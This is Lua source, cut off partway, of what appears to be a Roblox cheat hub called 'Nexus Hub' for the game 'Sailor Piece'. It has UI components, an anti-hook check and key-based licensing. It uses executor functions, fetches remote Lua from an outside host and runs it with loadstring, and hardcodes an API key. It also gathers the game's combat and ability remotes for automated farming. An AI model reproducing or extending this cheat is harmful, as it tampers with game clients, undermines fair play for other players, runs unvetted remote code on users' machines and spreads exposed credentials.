    timeVal.TextColor3 = Theme.Colors.AccentOrange
    timeVal.TextXAlignment = Enum.TextXAlignment.Left
    timeVal.Parent = container

    return container, timeVal
end

-- ============================================
-- STATUS BAR
-- ============================================

function Components.createStatusBar(parent, order)
    local bar = Instance.new("Frame")
    bar.Name = "StatusBar"
    bar.Size = UDim2.new(1, 0, 0, 28)
    bar.BackgroundColor3 = Theme.Colors.BgCard
    bar.BorderSizePixel = 0
    bar.LayoutOrder = order or 0
    bar.Parent = parent
    Theme.corner(bar, Theme.Radius.MD)

    local dot = Instance.new("Frame")
    dot.Name = "Dot"
    dot.Size = UDim2.new(0, 6, 0, 6)
    dot.Position = UDim2.new(0, 10, 0.5, -3)
    dot.BackgroundColor3 = Theme.Colors.AccentGreen
    dot.BorderSizePixel = 0
    dot.Parent = bar
    Theme.corner(dot, Theme.Radius.Pill)
    TweenService:Create(dot, Theme.Tween.Pulse, { BackgroundTransparency = 0.4 }):Play()

    local text = Instance.new("TextLabel")
    text.Name = "Text"
    text.Size = UDim2.new(1, -22, 1, 0)
    text.Position = UDim2.new(0, 20, 0, 0)
    text.BackgroundTransparency = 1
    text.Text = "ACTIVE -- Scanning..."
    text.Font = Theme.Fonts.Mono
    text.TextSize = Theme.TextSize.XSmall
    text.TextColor3 = Theme.Colors.AccentGreen
    text.TextXAlignment = Enum.TextXAlignment.Left
    text.Parent = bar

    return bar, dot, text
end

-- ============================================
-- DROPDOWN (FIXED: overlay approach, no clipping)
-- Dropdown list is parented to ScreenGui with absolute positioning
-- so it never gets clipped by parent ScrollingFrame/ClipsDescendants
-- ============================================

function Components.createDropdown(parent, label, options, current, onChanged, order)
    local container = Instance.new("Frame")
    container.Name = "DD_" .. label
    container.Size = UDim2.new(1, 0, 0, 38)
    container.BackgroundTransparency = 1
    container.LayoutOrder = order or 0
    container.Parent = parent

    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(0, 70, 1, 0)
    lbl.BackgroundTransparency = 1
    lbl.Text = label
    lbl.Font = Theme.Fonts.Body
    lbl.TextSize = Theme.TextSize.Small
    lbl.TextColor3 = Theme.Colors.TextSecondary
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.Parent = container

    local btn = Instance.new("TextButton")
    btn.Name = "DDBtn"
    btn.Size = UDim2.new(1, -78, 0, 32)
    btn.Position = UDim2.new(0, 74, 0.5, -16)
    btn.BackgroundColor3 = Theme.Colors.BgInput
    btn.Text = current or options[1] or ""
    btn.Font = Theme.Fonts.Body
    btn.TextSize = Theme.TextSize.Small
    btn.TextColor3 = Theme.Colors.TextPrimary
    btn.TextXAlignment = Enum.TextXAlignment.Left
    btn.BorderSizePixel = 0
    btn.AutoButtonColor = false
    btn.ZIndex = 2
    btn.Parent = container
    Theme.corner(btn, Theme.Radius.SM)
    Theme.stroke(btn, Theme.Colors.Border, 1, 0.5)
    Theme.padding(btn, 0, 10, 0, 10)
    Theme.clickEffect(btn)

    local arrow = Instance.new("TextLabel")
    arrow.Size = UDim2.new(0, 16, 1, 0)
    arrow.Position = UDim2.new(1, -20, 0, 0)
    arrow.BackgroundTransparency = 1
    arrow.Text = "v"
    arrow.Font = Theme.Fonts.Mono
    arrow.TextSize = Theme.TextSize.Micro
    arrow.TextColor3 = Theme.Colors.TextMuted
    arrow.ZIndex = 3
    arrow.Parent = btn

    -- Dropdown list: parented to ScreenGui for absolute positioning (no clipping)
    local screenGui = Layout.getScreenGui()
    local dropList = Instance.new("Frame")
    dropList.Name = "DropOverlay_" .. label
    dropList.BackgroundColor3 = Theme.Colors.BgSidebar
    dropList.BorderSizePixel = 0
    dropList.Visible = false
    dropList.ZIndex = 500
    dropList.ClipsDescendants = true
    dropList.Parent = screenGui
    Theme.corner(dropList, Theme.Radius.SM)
    Theme.stroke(dropList, Theme.Colors.Border, 1, 0.3)

    local scroll = Instance.new("ScrollingFrame")
    scroll.Size = UDim2.new(1, 0, 1, 0)
    scroll.BackgroundTransparency = 1
    scroll.BorderSizePixel = 0
    scroll.ScrollBarThickness = 2
    scroll.ScrollBarImageColor3 = Theme.Colors.AccentCyan
    scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
    scroll.ZIndex = 501
    scroll.Parent = dropList

    local ll = Instance.new("UIListLayout")
    ll.SortOrder = Enum.SortOrder.LayoutOrder
    ll.Parent = scroll

    for i, opt in ipairs(options) do
        local optBtn = Instance.new("TextButton")
        optBtn.Size = UDim2.new(1, 0, 0, 28)
        optBtn.BackgroundColor3 = Theme.Colors.BgSidebar
        optBtn.Text = "  " .. opt
        optBtn.Font = Theme.Fonts.Body
        optBtn.TextSize = Theme.TextSize.Small
        optBtn.TextColor3 = Theme.Colors.TextPrimary
        optBtn.TextXAlignment = Enum.TextXAlignment.Left
        optBtn.BorderSizePixel = 0
        optBtn.AutoButtonColor = false
        optBtn.LayoutOrder = i
        optBtn.ZIndex = 502
        optBtn.Parent = scroll
        Theme.corner(optBtn, Theme.Radius.XS)

        optBtn.MouseEnter:Connect(function()
            TweenService:Create(optBtn, Theme.Tween.Fast, { BackgroundColor3 = Theme.Colors.BgHover }):Play()
        end)
        optBtn.MouseLeave:Connect(function()
            TweenService:Create(optBtn, Theme.Tween.Fast, { BackgroundColor3 = Theme.Colors.BgSidebar }):Play()
        end)
        optBtn.MouseButton1Click:Connect(function()
            btn.Text = opt
            dropList.Visible = false
            arrow.Text = "v"
            if onChanged then onChanged(opt) end
        end)
    end

    local isOpen = false

    -- Position dropdown below button using absolute coords
    local function positionDropdown()
        local absPos = btn.AbsolutePosition
        local absSize = btn.AbsoluteSize
        local h = math.min(#options, 5) * 28
        dropList.Position = UDim2.new(0, absPos.X, 0, absPos.Y + absSize.Y + 4)
        dropList.Size = UDim2.new(0, absSize.X, 0, h)
    end

    btn.MouseButton1Click:Connect(function()
        isOpen = not isOpen
        if isOpen then
            positionDropdown()
            dropList.Visible = true
            arrow.Text = "^"
        else
            dropList.Visible = false
            arrow.Text = "v"
        end
    end)

    btn.MouseEnter:Connect(function()
        TweenService:Create(btn, Theme.Tween.Fast, { BackgroundColor3 = Theme.Colors.BgHover }):Play()
    end)
    btn.MouseLeave:Connect(function()
        TweenService:Create(btn, Theme.Tween.Fast, { BackgroundColor3 = Theme.Colors.BgInput }):Play()
    end)

    return container, btn
end

-- ============================================
-- TOGGLE SWITCH
-- ============================================

function Components.createToggle(parent, label, initial, onChanged, order)
    local container = Instance.new("Frame")
    container.Name = "Tog_" .. label
    container.Size = UDim2.new(1, 0, 0, 28)
    container.BackgroundTransparency = 1
    container.LayoutOrder = order or 0
    container.Parent = parent

    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(1, -50, 1, 0)
    lbl.BackgroundTransparency = 1
    lbl.Text = label
    lbl.Font = Theme.Fonts.Body
    lbl.TextSize = Theme.TextSize.Small
    lbl.TextColor3 = Theme.Colors.TextSecondary
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.Parent = container

    local track = Instance.new("TextButton")
    track.Size = UDim2.new(0, 38, 0, 20)
    track.Position = UDim2.new(1, -42, 0.5, -10)
    track.BackgroundColor3 = initial and Theme.Colors.AccentCyan or Theme.Colors.BgTertiary
    track.Text = ""
    track.BorderSizePixel = 0
    track.AutoButtonColor = false
    track.Parent = container
    Theme.corner(track, Theme.Radius.Pill)

    local knob = Instance.new("Frame")
    knob.Size = UDim2.new(0, 14, 0, 14)
    knob.Position = initial and UDim2.new(1, -17, 0.5, -7) or UDim2.new(0, 3, 0.5, -7)
    knob.BackgroundColor3 = Theme.Colors.TextPrimary
    knob.BorderSizePixel = 0
    knob.Parent = track
    Theme.corner(knob, Theme.Radius.Pill)

    local isOn = initial == true

    local function setToggleState(nextValue)
        isOn = nextValue == true
        local pos = isOn and UDim2.new(1, -17, 0.5, -7) or UDim2.new(0, 3, 0.5, -7)
        local col = isOn and Theme.Colors.AccentCyan or Theme.Colors.BgTertiary
        TweenService:Create(knob, Theme.Tween.Normal, { Position = pos }):Play()
        TweenService:Create(track, Theme.Tween.Normal, { BackgroundColor3 = col }):Play()
    end

    track.MouseButton1Click:Connect(function()
        local requestedState = not isOn
        local resolvedState = requestedState
        if onChanged then
            local callbackValue = onChanged(requestedState)
            if type(callbackValue) == "boolean" then
                resolvedState = callbackValue
            end
        end
        setToggleState(resolvedState)
    end)

    return {
        container = container,
        label = lbl,
        track = track,
        knob = knob,
        get = function()
            return isOn
        end,
        set = function(nextValue)
            setToggleState(nextValue)
        end,
    }
end

-- ============================================
-- KILL FEED
-- ============================================

function Components.createKillFeed(parent, order)
    local feed = Instance.new("Frame")
    feed.Name = "KillFeed"
    feed.Size = UDim2.new(1, 0, 0, 160)
    feed.BackgroundColor3 = Theme.Colors.BgCard
    feed.BorderSizePixel = 0
    feed.LayoutOrder = order or 0
    feed.ClipsDescendants = true
    feed.Parent = parent
    Theme.corner(feed, Theme.Radius.MD)

    local scroll = Instance.new("ScrollingFrame")
    scroll.Name = "FeedScroll"
    scroll.Size = UDim2.new(1, 0, 1, 0)
    scroll.BackgroundTransparency = 1
    scroll.BorderSizePixel = 0
    scroll.ScrollBarThickness = 2
    scroll.ScrollBarImageColor3 = Theme.Colors.AccentRed
    scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
    scroll.Parent = feed

    local ll = Instance.new("UIListLayout")
    ll.SortOrder = Enum.SortOrder.LayoutOrder
    ll.Padding = UDim.new(0, 1)
    ll.Parent = scroll

    return feed, scroll
end

function Components.addKillFeedEntry(scroll, target, bounty, idx)
    local entry = Instance.new("TextLabel")
    entry.Name = "K_" .. idx
    entry.Size = UDim2.new(1, 0, 0, 18)
    entry.BackgroundTransparency = 1
    entry.Text = "  [KILL] " .. target .. "  +" .. tostring(bounty)
    entry.Font = Theme.Fonts.Mono
    entry.TextSize = Theme.TextSize.XSmall
    entry.TextColor3 = Theme.Colors.AccentRed
    entry.TextXAlignment = Enum.TextXAlignment.Left
    entry.LayoutOrder = -idx
    entry.Parent = scroll

    entry.TextTransparency = 1
    TweenService:Create(entry, Theme.Tween.Normal, { TextTransparency = 0 }):Play()
end

-- ============================================
-- INFO ROW (label + live value)
-- ============================================

function Components.createInfoRow(parent, label, valueFn, order)
    local row = Instance.new("Frame")
    row.Name = "Info_" .. label
    row.Size = UDim2.new(1, 0, 0, 32)
    row.BackgroundColor3 = Theme.Colors.BgCard
    row.BorderSizePixel = 0
    row.LayoutOrder = order or 0
    row.Parent = parent
    Theme.corner(row, Theme.Radius.SM)

    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(0.45, 0, 1, 0)
    lbl.Position = UDim2.new(0, 12, 0, 0)
    lbl.BackgroundTransparency = 1
    lbl.Text = label
    lbl.Font = Theme.Fonts.Body
    lbl.TextSize = Theme.TextSize.Small
    lbl.TextColor3 = Theme.Colors.TextSecondary
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.Parent = row

    local val = Instance.new("TextLabel")
    val.Name = "Value"
    val.Size = UDim2.new(0.5, -12, 1, 0)
    val.Position = UDim2.new(0.5, 0, 0, 0)
    val.BackgroundTransparency = 1
    val.Text = (type(valueFn) == "function") and valueFn() or tostring(valueFn)
    val.Font = Theme.Fonts.Mono
    val.TextSize = Theme.TextSize.Small
    val.TextColor3 = Theme.Colors.TextPrimary
    val.TextXAlignment = Enum.TextXAlignment.Right
    val.Parent = row

    if type(valueFn) == "function" then
        G.spawn(function()
            while val and val.Parent do
                G.pcall(function()
                    val.Text = valueFn()
                end)
                G.wait(2)
            end
        end)
    end

    return row
end

-- ============================================
-- THEME PRESET BUTTON
-- ============================================

function Components.createThemeButton(parent, name, bgColor, accentColor, order)
    local btn = Instance.new("TextButton")
    btn.Name = "Theme_" .. name
    btn.Size = UDim2.new(1, 0, 0, 36)
    btn.BackgroundColor3 = Theme.Colors.BgCard
    btn.BorderSizePixel = 0
    btn.Text = ""
    btn.AutoButtonColor = false
    btn.LayoutOrder = order or 0
    btn.Parent = parent
    Theme.corner(btn, Theme.Radius.SM)
    Theme.clickEffect(btn)

    local swatch = Instance.new("Frame")
    swatch.Size = UDim2.new(0, 24, 0, 24)
    swatch.Position = UDim2.new(0, 8, 0.5, -12)
    swatch.BackgroundColor3 = bgColor
    swatch.BorderSizePixel = 0
    swatch.Parent = btn
    Theme.corner(swatch, Theme.Radius.SM)

    local accentDot = Instance.new("Frame")
    accentDot.Size = UDim2.new(0, 8, 0, 8)
    accentDot.Position = UDim2.new(1, -10, 1, -10)
    accentDot.BackgroundColor3 = accentColor
    accentDot.BorderSizePixel = 0
    accentDot.Parent = swatch
    Theme.corner(accentDot, Theme.Radius.Pill)

    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(1, -44, 1, 0)
    lbl.Position = UDim2.new(0, 40, 0, 0)
    lbl.BackgroundTransparency = 1
    lbl.Text = name
    lbl.Font = Theme.Fonts.Body
    lbl.TextSize = Theme.TextSize.Small
    lbl.TextColor3 = Theme.Colors.TextPrimary
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.Parent = btn

    btn.MouseEnter:Connect(function()
        TweenService:Create(btn, Theme.Tween.Fast, { BackgroundColor3 = Theme.Colors.BgHover }):Play()
    end)
    btn.MouseLeave:Connect(function()
        TweenService:Create(btn, Theme.Tween.Fast, { BackgroundColor3 = Theme.Colors.BgCard }):Play()
    end)

    return btn
end

return Components
end)()

do
    if not SailorAntiHook.verify() then
        error("[NexusHub] Environment compromised at startup. Aborting.", 0)
    end

    SailorAntiHook.startMonitor()

    local SailorG = SailorAntiHook.globals
    SailorUtils.init(SailorAntiHook)
    SailorSaveKey.init(SailorAntiHook)
    SailorAuth.init(SailorAntiHook, SailorUtils, SailorSaveKey)
    SailorTheme.initTweens()

    local SailorConfig = {
        getProductDisplayName = function()
            return _NEXUS_PRODUCT_DISPLAY_NAME
        end,
        getProductHandle = function()
            return _NEXUS_PRODUCT_HANDLE
        end,
        getVersion = function()
            return _NEXUS_CLIENT_VERSION
        end,
        getProductInstanceName = function()
            return _NEXUS_PRODUCT_INSTANCE
        end,
    }

    local SailorLayout = {
        getProductDisplayName = function()
            return _NEXUS_PRODUCT_DISPLAY_NAME
        end,
    }

    SailorAssets.init(SailorAntiHook)
    SailorComponents.init(SailorAntiHook, SailorTheme, SailorLayout, SailorConfig, SailorAssets)

    local function getEnv()
        if SailorG.type(SailorG.getgenv) == "function" then
            return SailorG.getgenv()
        end
        return _G
    end

    local function trim(value)
        local text = SailorG.tostring(value or "")
        text = SailorG.str_gsub(text, "^%s+", "")
        text = SailorG.str_gsub(text, "%s+$", "")
        return text
    end

    local function compareVersions(left, right)
        local leftParts = {}
        local rightParts = {}
        for part in SailorG.str_gmatch(SailorG.tostring(left or "0"), "[^%.]+") do
            SailorG.tbl_insert(leftParts, tonumber(part) or 0)
        end
        for part in SailorG.str_gmatch(SailorG.tostring(right or "0"), "[^%.]+") do
            SailorG.tbl_insert(rightParts, tonumber(part) or 0)
        end
        local count = math.max(#leftParts, #rightParts)
        for index = 1, count do
            local a = leftParts[index] or 0
            local b = rightParts[index] or 0
            if a > b then return 1 end
            if a < b then return -1 end
        end
        return 0
    end

    local function checkServerVersion()
        local response = SailorUtils.httpGet(_NEXUS_VERSION_URL)
        if response and response.version then
            SailorG.rawset(getEnv(), "NexusHubServerVersion", response.version)
        end
        if response and response.min_version and compareVersions(_NEXUS_CLIENT_VERSION, response.min_version) < 0 then
            return false, "Client update required. Minimum v" .. SailorG.tostring(response.min_version)
        end
        return true, nil
    end

    SailorG.pcall(function()
        local env = getEnv()
        SailorG.rawset(env, "NexusHubProduct", _NEXUS_PRODUCT)
        SailorG.rawset(env, "NexusHubTier", _NEXUS_TIER)
        SailorG.rawset(env, "NexusHubScriptId", _NEXUS_SCRIPT_ID)
        SailorG.rawset(env, "NexusHubClientVersion", _NEXUS_CLIENT_VERSION)
        SailorG.rawset(env, "NexusHubExpectedServerVersion", _NEXUS_SERVER_VERSION)
        SailorG.rawset(env, "NexusHubAuthenticated", false)
    end)

    local function resolveKey()
        local env = getEnv()
        local config = SailorG.rawget(env, "nexus_hub")
        if SailorG.type(config) ~= "table" then
            config = SailorG.rawget(env, "nexus")
        end
        if SailorG.type(config) == "table" and SailorG.type(config.key) == "string" and trim(config.key) ~= "" then
            return config.key
        end

        local keyNames = {
            "NexusHubKey",
            "SailorPieceKey",
            "NexusKey",
            "NexusUIKey",
            "ApiKey",
            "Key",
        }

        if _NEXUS_TIER == "PREMIUM" then
            SailorG.tbl_insert(keyNames, 1, "NexusPremiumKey")
        else
            SailorG.tbl_insert(keyNames, 1, "NexusFreeKey")
        end

        for _, keyName in SailorG.ipairs(keyNames) do
            local value = env and SailorG.rawget(env, keyName)
            if SailorG.type(value) == "string" and trim(value) ~= "" then
                return value
            end
        end

        return SailorSaveKey.load()
    end

    local authValidated = false
    local validating = false
    local CoreGui = SailorG.GetService(game, "CoreGui")
    local Players = SailorG.GetService(game, "Players")
    local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()
    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

    local authGui = Instance.new("ScreenGui")
    authGui.Name = _NEXUS_PRODUCT_INSTANCE .. "Auth"
    authGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    authGui.ResetOnSpawn = false
    authGui.IgnoreGuiInset = true
    authGui.DisplayOrder = 10000
    SailorG.pcall(function()
        local env = getEnv()
        local gethuiFn = SailorG.rawget(env, "gethui")
        if SailorG.type(gethuiFn) == "function" then
            authGui.Parent = gethuiFn()
        else
            authGui.Parent = CoreGui
        end
    end)
    if not authGui.Parent then
        authGui.Parent = PlayerGui
    end

    local authRefs = SailorComponents.createAuthScreen(authGui)
    authRefs.statusLabel.Text = (_NEXUS_TIER == "PREMIUM") and "Enter your Nexus Premium key" or "Enter your Nexus Hub free key"
    authRefs.statusLabel.TextColor3 = SailorTheme.Colors.TextSecondary

    if _NEXUS_TIER == "PREMIUM" and authRefs.freeKeyBtn then
        authRefs.freeKeyBtn.Visible = false
        authRefs.freeKeyBtn.Size = UDim2.new(1, 0, 0, 0)
    elseif authRefs.freeKeyBtn then
        authRefs.freeKeyBtn.Visible = true
        authRefs.freeKeyBtn.Text = "GET FREE KEY"
    end

    local function markValidated(key)
        local data = SailorAuth.getKeyData()
        if _NEXUS_TIER == "PREMIUM" and data and (data.keyType == "free" or data.isPremium == false) then
            SailorSaveKey.clear()
            return false, "Premium key required for this script."
        end
        if _NEXUS_TIER == "FREE" and data and (data.keyType == "premium" or data.isPremium == true) then
            SailorSaveKey.clear()
            return false, "Use the premium script for premium keys."
        end

        SailorAuth.startRevalidation(key)
        local env = getEnv()
        SailorG.rawset(env, "NexusHubAuthenticated", true)
        SailorG.rawset(env, "NexusHubTier", _NEXUS_TIER)
        SailorG.rawset(env, "NexusHubProduct", _NEXUS_PRODUCT)
        SailorG.rawset(env, "NexusHubScriptId", _NEXUS_SCRIPT_ID)
        SailorG.rawset(env, "NexusHubClientVersion", _NEXUS_CLIENT_VERSION)
        SailorG.rawset(env, "NexusHubKeyData", data)
        SailorG.rawset(env, "ShuttingDown", false)
        authValidated = true
        return true, nil
    end

    local function setAuthBusy(isBusy)
        authRefs.spinner.Visible = isBusy == true
        authRefs.validateBtn.Text = isBusy and "VALIDATING..." or "VALIDATE KEY"
    end

    local function doValidate(key)
        if validating or authValidated then
            return
        end

        key = trim(key)
        if key == "" then
            authRefs.statusLabel.Text = "Please enter a key"
            authRefs.statusLabel.TextColor3 = SailorTheme.Colors.AccentGold
            SailorComponents.shakeAuthCard(authRefs.card)
            return
        end

        validating = true
        setAuthBusy(true)
        authRefs.statusLabel.Text = "Checking version..."
        authRefs.statusLabel.TextColor3 = SailorTheme.Colors.AccentCyan

        SailorG.spawn(function()
            local versionOk, versionErr = checkServerVersion()
            if not versionOk then
                validating = false
                setAuthBusy(false)
                authRefs.statusLabel.Text = versionErr or "Client update required"
                authRefs.statusLabel.TextColor3 = SailorTheme.Colors.AccentRed
                SailorComponents.shakeAuthCard(authRefs.card)
                return
            end

            authRefs.statusLabel.Text = "Validating..."
            authRefs.statusLabel.TextColor3 = SailorTheme.Colors.AccentCyan

            local ok, err = SailorAuth.validate(key)
            if ok then
                ok, err = markValidated(key)
            end

            validating = false
            setAuthBusy(false)
            if ok then
                authRefs.statusLabel.Text = "Key validated!"
                authRefs.statusLabel.TextColor3 = SailorTheme.Colors.AccentGreen
                SailorG.wait(0.6)
                SailorComponents.dismissAuthScreen(authRefs)
                SailorG.delay(0.55, function()
                    if authGui and authGui.Parent then
                        authGui:Destroy()
                    end
                end)
            else
                authRefs.statusLabel.Text = err or "Invalid key"
                authRefs.statusLabel.TextColor3 = SailorTheme.Colors.AccentRed
                SailorComponents.shakeAuthCard(authRefs.card)
            end
        end)
    end

    authRefs.validateBtn.MouseButton1Click:Connect(function()
        doValidate(authRefs.inputBox.Text)
    end)

    authRefs.inputBox.FocusLost:Connect(function(enterPressed)
        if enterPressed then
            doValidate(authRefs.inputBox.Text)
        end
    end)

    local resolvedKey = resolveKey()
    if resolvedKey and trim(resolvedKey) ~= "" then
        authRefs.inputBox.Text = resolvedKey
        authRefs.statusLabel.Text = "Saved key found. Validating..."
        authRefs.statusLabel.TextColor3 = SailorTheme.Colors.AccentCyan
        SailorG.defer(function()
            doValidate(resolvedKey)
        end)
    end

    SailorG.pcall(function()
        game:BindToClose(function()
            SailorG.pcall(function()
                SailorG.rawset(getEnv(), "ShuttingDown", true)
                SailorAuth.stop()
                SailorAntiHook.stopMonitor()
            end)
        end)
    end)

    repeat
        SailorG.wait(0.1)
    until authValidated == true
end
-- END NEXUS HUB AUTH BOOTSTRAP

]]

function missing(t, f, fallback)
    if type(f) == t then
        return f
    end

    return fallback
end

cloneref = missing('function', cloneref, function(...)
    return ...
end)
getgc = missing('function', getgc or get_gc_objects)
getconnections = missing('function', getconnections or get_signal_cons)
Services = setmetatable({}, {
    __index = function(self, name)
        local success, cache = pcall(function()
            return cloneref(game:GetService(name))
        end)

        if success then
            rawset(self, name, cache)

            return cache
        else
            error('Invalid Service: ' .. tostring(name))
        end
    end,
})

local Players = Services.Players
local Plr = Players.LocalPlayer
local Char = Plr.Character or Plr.CharacterAdded:Wait()
local PGui = Plr:WaitForChild('PlayerGui')
local Lighting = game:GetService('Lighting')
local RS = Services.ReplicatedStorage
local RunService = Services.RunService
local HttpService = Services.HttpService
local LocalizationService = Services.LocalizationService
local GuiService = Services.GuiService
local TeleportService = Services.TeleportService
local Marketplace = Services.MarketplaceService
local UIS = Services.UserInputService
local VirtualUser = Services.VirtualUser
local TweenService = game:GetService('TweenService')
local v, Asset = pcall(function()
    return Marketplace:GetProductInfo(game.PlaceId)
end)
local assetName = (v and Asset) and Asset.Name or 'Sailor Piece'
local Support = {
    Webhook = (typeof(request) == 'function' or typeof(http_request) == 'function'),
    Clipboard = (typeof(setclipboard) == 'function'),
    FileIO = (typeof(writefile) == 'function' and typeof(isfile) == 'function'),
    QueueOnTP = (typeof(queue_on_teleport) == 'function'),
    Connections = (typeof(getconnections) == 'function'),
    FPS = (typeof(setfpscap) == 'function'),
    Proximity = (typeof(fireproximityprompt) == 'function'),
}
local executorName = (identifyexecutor and identifyexecutor() or 'Unknown'):lower()
local isXeno = string.find(executorName, 'xeno') ~= nil
local isLimitedExecutor = false

for _, name in ipairs({
    'xeno',
})do
    if string.find(executorName, name) then
        isLimitedExecutor = true

        break
    end
end

local API_KEY = "AFEF-629D-14EA-BF8B-E6F6-5329-7F94-6595"
local ui_lib = 'https://bnty.nexusdevs.fun/pf9WL9pIrjI8Bo7fMi6SVabR1W0VCbC7qLb7L9QImtd.lua'

local function LoadNexusUI()
    local source

    if type(isfile) == 'function' and type(readfile) == 'function' then
        local okExists, exists = pcall(isfile, 'ui.lua')
        if okExists and exists then
            local okRead, localSource = pcall(readfile, 'ui.lua')
            if okRead and type(localSource) == 'string' and localSource ~= '' then
                source = localSource
            end
        end
    end

    if not source then
        source = game:HttpGet(ui_lib)
    end

    local chunk, loadErr = loadstring(source)
    if not chunk then
        error('Failed to load Nexus UI: ' .. tostring(loadErr))
    end

    return chunk()
end

local NexusUI = LoadNexusUI()
NexusUI.SetApiKey(API_KEY)

local UI = NexusUI.new({
    Name = '[ Sailor Piece ]',
    ApiKey = API_KEY,
    RequireApiKey = false,
    RequireSecurity = false,
    Security = {
        Required = false,
    },
    AccentColor = Color3.fromRGB(168, 85, 247),
    BackgroundColor = Color3.fromRGB(16, 16, 16),
    TextColor = Color3.fromRGB(255, 255, 255),
    SubTextColor = Color3.fromRGB(124, 124, 124),
    DynamicIslandTitle = 'Nexus Hub ' .. ((_NEXUS_TIER == 'FREE') and 'Free' or 'Premium'),
    DynamicIslandLogoSource = 'https://raw.githubusercontent.com/ryudacatt/assetsfora/main/logo.png',
    BackgroundImageSource = 'https://raw.githubusercontent.com/ryudacatt/assetsfora/main/logo.png',
    BackgroundImageTransparency = 0.9,
})
local ConfigName = 'NexusHub_' .. ((_NEXUS_TIER == 'FREE') and 'Free' or 'Premium') .. '_Config_' .. tostring(game:GetService('Players').LocalPlayer.UserId)

UI:SetToggleKey(Enum.KeyCode.RightControl)
local function NormalizeNexusConfig(config, fallbackName)
    if type(config) == 'table' then
        local normalized = {}

        for key, value in pairs(config) do
            normalized[key] = value
        end

        local name = normalized.Name or normalized.Title or normalized.Text or normalized.Label or fallbackName or 'Page'
        normalized.Name = tostring(name)

        return normalized
    end

    return {Name = tostring(config or fallbackName or 'Page')}
end

local function CloneNexusConfig(config)
    local cloned = {}

    if type(config) == 'table' then
        for key, value in pairs(config) do
            cloned[key] = value
        end
    end

    return cloned
end

local function CreateBalancedNexusGroup(tab, originalAddGroup, groupConfig)
    local baseConfig = CloneNexusConfig(groupConfig)
    local leftConfig = CloneNexusConfig(baseConfig)

    leftConfig.Side = 'Left'

    local leftGroup = originalAddGroup(tab, leftConfig)
    local rightGroup = nil
    local nextSide = 'Left'
    local proxy = {
        Left = leftGroup,
    }

    local function getRightGroup()
        if not rightGroup then
            local rightConfig = CloneNexusConfig(baseConfig)

            rightConfig.Side = 'Right'
            rightGroup = originalAddGroup(tab, rightConfig)
            proxy.Right = rightGroup
        end

        return rightGroup
    end

    local function getNextGroup()
        if nextSide == 'Left' then
            nextSide = 'Right'

            return leftGroup
        end

        nextSide = 'Left'

        return getRightGroup()
    end

    for _, methodName in ipairs({
        'AddToggle',
        'AddSlider',
        'AddButton',
        'AddKeybind',
        'AddKeybindToggle',
        'AddDropdown',
        'AddMultiDropdown',
        'AddDivider',
        'AddLabel',
        'AddTextInput',
        'AddTextbox',
        'AddTextBox',
        'AddColorPicker',
    }) do
        proxy[methodName] = function(_, elementConfig)
            local group = getNextGroup()
            local method = group and group[methodName]

            if type(method) ~= 'function' then
                error('Nexus group method missing: ' .. tostring(methodName))
            end

            return method(group, elementConfig)
        end
    end

    return proxy
end

local NexusPageSections = {
    Info = 'Home',
    ['Farm Config'] = 'Farm',
    ['Level Farm'] = 'Farm',
    ['Boss Farm'] = 'Farm',
    ['Sea 2 Farm'] = 'Farm',
    ['Easter Event'] = 'Events',
    Dungeon = 'Dungeons',
    ['Infinite Tower'] = 'Dungeons',
    ['Crystal Defense'] = 'Dungeons',
    ['Merchant & Chest'] = 'Inventory',
    ['Auto Upgrade'] = 'Progression',
    ["Haki's"] = 'Progression',
    ['Fighting Style'] = 'Progression',
    Puzzles = 'Progression',
    Stats = 'Progression',
    Rolls = 'Progression',
    ['Title Switch'] = 'Loadouts',
    ['Rune Switch'] = 'Loadouts',
    ['Relic Switch'] = 'Loadouts',
    ['Build Switch'] = 'Loadouts',
    Islands = 'Teleport',
    Graphics = 'Utility',
    Server = 'Utility',
    Webhook = 'Utility',
    Config = 'Utility',
}

local NexusSectionCache = {}

local function GetNexusSection(sectionName, icon)
    local cacheKey = tostring(sectionName or 'Main')
    local cached = NexusSectionCache[cacheKey]
    if cached then
        return cached
    end

    local section = UI:CreateSection({
        Name = cacheKey,
        Icon = icon,
    })

    NexusSectionCache[cacheKey] = section
    return section
end

local function CreateNexusPage(pageConfig)
    local page = NormalizeNexusConfig(pageConfig, 'Page')
    local pageName = page.TabName or page.Name
    local sectionName = page.SectionName or page.Section or NexusPageSections[pageName] or pageName
    local section = GetNexusSection(sectionName, page.SectionIcon)

    local tab = section:AddTab({
        Name = pageName,
        Description = page.Description or page.Desc or pageName,
        Icon = page.TabIcon or page.Icon,
    })

    if type(tab) == 'table' and type(tab.AddGroup) == 'function' and not tab.__NexusBalancedGroups then
        local originalAddGroup = tab.AddGroup

        function tab:AddGroup(groupConfig)
            groupConfig = groupConfig or {}

            if groupConfig.Side ~= nil or groupConfig.Balanced == false then
                return originalAddGroup(self, groupConfig)
            end

            return CreateBalancedNexusGroup(self, originalAddGroup, groupConfig)
        end

        tab.__NexusBalancedGroups = true
    end

    return tab
end

getgenv().NexusHub = true

function GetSafeModule(parent, name)
    local obj = parent:FindFirstChild(name)

    if obj and obj:IsA('ModuleScript') then
        local ok, res = pcall(require, obj)

        if ok then
            return res
        end
    end

    return nil
end
function GetRemote(parent, pathString)
    local current = parent

    for _, name in ipairs(pathString:split('.'))do
        if not current then
            return nil
        end

        current = current:FindFirstChild(name)
    end

    return current
end

local Remotes = {
    SettingsToggle = GetRemote(RS, 'RemoteEvents.SettingsToggle'),
    SettingsSync = GetRemote(RS, 'RemoteEvents.SettingsSync'),
    UseCode = GetRemote(RS, 'RemoteEvents.CodeRedeem'),
    M1 = GetRemote(RS, 'CombatSystem.Remotes.RequestHit'),
    EquipWeapon = GetRemote(RS, 'Remotes.EquipWeapon'),
    UseSkill = GetRemote(RS, 'AbilitySystem.Remotes.RequestAbility'),
